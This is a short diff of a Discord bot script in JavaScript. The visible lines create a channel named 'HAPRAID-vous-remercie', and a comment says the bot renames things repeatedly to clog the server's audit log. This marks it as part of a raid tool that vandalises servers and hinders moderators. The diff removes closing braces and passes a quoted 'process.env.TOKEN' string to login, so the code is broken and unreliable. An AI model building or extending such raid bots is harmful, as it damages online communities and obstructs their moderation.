@@ -49,11 +49,6 @@ bot.on('message', msg => {
             msg.guild.createChannel('HAPRAID-vous-remercie', 'text')
             //changes name tons of times to clog up the audit log
            
-        }
-    }
- 
-     
-   
 });
  
 bot.login('process.env.TOKEN');
